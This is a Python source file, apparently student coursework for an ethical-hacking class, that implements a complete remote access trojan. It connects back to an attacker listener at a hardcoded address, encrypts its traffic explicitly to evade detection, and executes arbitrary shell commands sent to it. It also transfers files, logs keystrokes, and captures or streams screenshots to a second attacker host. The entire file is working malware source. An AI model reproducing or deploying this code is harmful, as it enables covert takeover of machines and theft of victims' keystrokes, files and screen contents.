################################################
# Authors: Korn D., Krittanut Y.,              #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary Python modules
import socket  # For network communication
import threading
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system
from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
import mss.tools
from pynput import keyboard  # For capturing keyboard input
import mss  # For taking screenshots
import base64  # For encoding and decoding data in base64 format
import io # For treating image bytes like a file in memory
from PIL import Image # To convert raw RGB data to JPEG for compression

# Pre-shared key for encryption
psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
    data_len = len(encrypted_data)
    s.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
    s.sendall(encrypted_data)


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data_len_bytes = s.recv(4)
    if not data_len_bytes:
        return None
    data_len = int.from_bytes(data_len_bytes, 'big')
    data = b''
    while len(data) < data_len:
        packet = s.recv(data_len - len(data))
        if not packet:
            return None
        data += packet
    decrypted_data = cipher.decrypt(data)
    return json.loads(decrypted_data.decode())


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with Listener IP and port 5555
            s.connect(('192.168.210.143', 5555))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done

log = ""
keylogger_running = False

def on_press(key):
    global log
    try:
        # Append the pressed key to the log
        log += key.char
    except AttributeError:
        # Handle special keys (like Ctrl, Alt, etc.)
        if key == key.space:
            log += ' '
        elif key == key.enter:
            log += '\n'
        else:
            log += f'[{key}]'

def start_keylogger():
    global keylogger_running
    keylogger_running = True

    def run():
        with keyboard.Listener(on_press=on_press) as listener:
            while keylogger_running:
                pass
            listener.stop()
    # Start the keylogger in a separate thread
    t = threading.Thread(target=run)
    t.daemon = True  # Set the thread as a daemon so it exits when the main program exits
    t.start()

def stop_keylogger():
    global keylogger_running, log
    keylogger_running = False
    time.sleep(1)  # Give the keylogger some time to finish capturing keys
    # Clear the log when stopping the keylogger
    log = ""

def retrieve_keylogger_log():
    global log
    log_data = log
    log = ""  # Clear the log after retrieving it
    return log_data

# Function to take a screenshot and send it to the remote host
def take_screenshot():
    with mss.mss() as sct:
        # Capture the screen
        screenshot = sct.grab(sct.monitors[0])  # Capture full screen
        image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
        encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
        return encoded_img 
    
# Function to start screen streaming
def stream_screen():
    try: # Runs in a separate thread and continuously sends screenshots to the server
        stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
        stream_socket.connect(('192.168.56.101', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
        with mss.mss() as sct: # Open a screen capture session using mss
            while True: # Loop forever to take screenshots
                screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
                img = Image.frombytes('RGB', screenshots.size, screenshots.rgb) # Convert raw RGB data to a PIL image (we can't send raw RGB—it’s too large).
                buf = io.BytesIO() 
                img.save(buf, format='JPEG', quality=30) # Create an in-memory buffer and save the image as JPEG (compressed)
                data = buf.getvalue() # Convert the JPEG image to bytes.
                size = len(data).to_bytes(4, 'big')  # Prefix the image with a 4-byte size header (so the server knows how many bytes to read).
                stream_socket.sendall(size + data) # Send size + image together.
                time.sleep(0.5)  # adjust frame rate (2 FPS)
    except Exception as e:
        pass  # don’t crash if connection fails

        

# Main shell function for command execution
def shell():
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command[:3] == 'cd ':
            # If the command starts with 'cd ', change the current directory
            os.chdir(command[3:])
        elif command[:8] == 'download':
            # If the command starts with 'download', upload a file to the remote host
            upload_file(command[9:])
        elif command[:6] == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            download_file(command[7:])
        elif command == 'keylogger_start':
            # If the command is 'keylogger_start', start the keylogger
            start_keylogger()
            reliable_send("[+] Keylogger started.")
        elif command == 'keylogger_stop':
            # If the command is 'keylogger_stop', stop the keylogger
            stop_keylogger()
            reliable_send("[+] Keylogger stopped.")
        elif command == 'keylogger_dump':
            # If the command is 'dump_keyslog', retrieve the keylogger log
            log_data = retrieve_keylogger_log()
            reliable_send(log_data)
        elif command == 'screenshot':
            # If the command is 'screenshot', take a screenshot and send it
            screenshot_data = take_screenshot()
            reliable_send(screenshot_data)
        elif command == 'screen_stream':
            t = threading.Thread(target=stream_screen)
            t.daemon = True
            t.start()
            reliable_send('[+] Screen streaming started.')
        else:
            try:
                # For other commands, execute them using subprocess
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode()  # Decode the output to a string
                # Send the command execution result back to the remote host
                reliable_send(result)
            except Exception as e:
                # If an error occurs during command execution, send the error message
                reliable_send(str(e))


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()